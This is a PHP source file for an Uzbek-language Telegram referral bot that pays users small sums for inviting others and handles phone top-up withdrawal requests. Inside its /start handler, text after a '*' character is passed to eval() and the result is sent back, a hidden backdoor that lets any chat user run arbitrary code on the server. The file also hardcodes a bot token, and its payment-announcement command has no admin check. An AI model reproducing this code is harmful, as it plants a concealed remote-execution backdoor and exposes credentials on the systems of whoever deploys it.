
<?php
ob_start();
define('API_KEY','851119594:AAHQDRtN5cAbxeRoiNZZcvSlxne08MOn0h0'); // botni tokeni kiritilsin
$admin = "513586863"; //admin id
$bot = "UzbiShonchlitolovbot"; //bot ismi
$kanalimz ="@Javobsiz_Sevgim"; //kanal useri
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";


if (!file_exists($folder.'/test.txt')) {
  mkdir($folder);
  file_put_contents($folder.'/test.txt', 'by ');
}

if (!file_exists($folder2.'/test.txt')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.txt', 'by ');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}


$tx = $message->text;
$name = $message->chat->first_name;
$user = $message->from->username;
$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"Referal silka"],['text'=>"Balans"]],
[['text'=>"Aloqa"],['text'=>"Pulni yechish"]],[['text'=>"Statistika"]]]
]);



$balinfo = "Salom🖐 Bu bot orqali Pul ishlab telefon raqamingizga pulni solishingiz mumkin.\n\n
☝️ Botdan foydalanish uchun @Javobsiz_Sevgim kanaliga obuna bo'lishingiz kerak. Keyin /start buyrugini bering.";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {
bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"$balinfo",
    'reply_markup'=>$key
    ]);
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.dat");
    file_put_contents("coin.dat","$baza\n$cid");
  }
if(strpos($tx,"/start $cid")!==false){
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"G'irromlik mum kin emas",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("coin/$refid.soni");
      $ab=$ab+1;
      file_put_contents("coin/$refid.soni","$ab");
      $usr = file_get_contents("coin/$refid.dat");
      $usr = $usr + 50;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'text'=>"Sizga taklifingiz uchun 50 so'm bonus taqdim etildi!",
      ]);
    }
  }
}
$abb=file_get_contents("coin/$cid.dat");
if($abb){}else{
  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}
}
if($tx == "Balans"){
      
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.dat");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Siz taklif qilgan odamlar soni - $odam ta \n\n Sizning balansingiz $ball So'm",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2, 
      ]);
    }
}
if($tx=="Pulni yechish"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Pulni yechish uchun eng kamida 4000 (4 Ming so'm) to'plashingiz kerak.\n\n
/pul so'zidan so'ng Telefon raqamingiz va summani yozing.

Masalan:

Telefonga Paynet qilish uchun:
/pul +9989xXXXXXXX 4000"
        ]);
    
    
}
if($tx=="Statistika"){
    $a=file_get_contents("coin.dat");
    $sum=file_get_contents("tolovlar.txt");
    $ab=substr_count($a,"\n");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Botimiz azolari $ab ta \n\n Jami To`langan summa: $sum sum"
        
        ]);
    
}
if(strpos($tx,"/pul")!==false){
    $ex=explode(" ",$tx);
    $ab=file_get_contents("coin/$cid.dat");
    
    if( $ex[2]>=4000 and $ab>=$ex[2] ){
$bb=$ab-$ex[2];
$t=file_get_contents("tolov.txt");
$t=$t+1;
file_put_contents("tolov.txt","$t");
$t=file_get_contents("tolov.txt");
  file_put_contents("coin/$cid.dat","$bb");
  $tolov=file_get_contents("tolovlar.txt");
  $tolov=$tolov+$ex[2];
  file_put_contents("tolovlar.txt","$tolov");

$bb=substr($ex[1],0,6);
$gg="xx";
$ss=substr($ex[1],8,8);
  file_put_contents("$cid.t","🔵 Status - ✅ \n\n 🆔 Tolov id: $t \n\n 👤 Qabul qiluvchini raqami: \n\n ☎️$bb $gg $ss \n\n 💰 Tolov summasi: $ex[2] sum");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Yaxshi $ex[1] Nomerga $ex[2] sum 24 soat davomida amalga oshiriladi buni @Javobsiz_Sevgim kanalida koring agar amalga oshirilmasa admin bilan boglaning!!"
        ]);
        
        bot('sendmessage',[
            'chat_id'=>$admin,
            'text'=>"*Pulni yechish uchun yangi zayavka tushdi * \n` zayavkachi haqida ma'lumot\n id raqami $cid\n username: @$user \n Ismi: `[$name](tg://user?id=$cid) \n *Tushuriladigon summa miqdori:$ex[2] sum  \n Raqami: $ex[1] \n\n Pul tolandimi tolangan bolsa tolandi=$cid shunday deb yozing!!* ",
            'disable_web_page_preview'=>true,
            'parse_mode'=>markdown,
            ]);
          //mualliflik huquqi @PaXaN_oKeN ga tegishlik va @PHP_KOD kanaliga azo boling
}else{bot('sendmessage',['chat_id'=>$cid,'text'=>"Sizning balansizngizda yetarli mablag' mavjud emas yegishni davom eting!! yoki minimal miqdordan oz kiritmoqdasiz"]);} }
if($tx=="Aloqa"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🤓 Bot Admini: @Koderboy\n\n
⏳ Ish Vaqti: 11:00 - 23:00\n\n
Reklama Berish Shartlari Bilan Tanishib Chiqing: @Javobsiz_Sevgim"
        
        ]);
    
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "Referal silka"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Sizning Referal Ssilkangiz https://t.me/UzbiShonchlitolovbot?start=$cid\n\n Buni do'stlarga tarqating va shu ssilka orqali kirgan har bir odam uchun 50 so'm pul oling.",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    $reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$reply_menu,
      ]);
    }

    if($replyik=="Yuboriladigon xabarni kiriting. Xabar turi markdown"){
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      $hamma=bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
    }
if($hamma){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Hammaga habar yetkazildi",

]);

}
    $nocha = "Xozircha kanallar yoq!";
    $noazo = "siz kanal royxatida yoqsiz.";
    $okcha = "kanalga azo boldingiz va 50 somga ega boldingiz 3 kun ichida chiqib ketsangiz 60 som shtraf.";

    }else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣siz $kanalimz ga azo boling va keyin bizda pul ishlay olasiz.",
    ]);
  }
}if(strpos($tx,"tolandi=")!==false){
    $ex=explode("=",$tx);
    $kanalimiz="-1419803058";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"Kanalga tashlandi!!"
        ]);
}
?>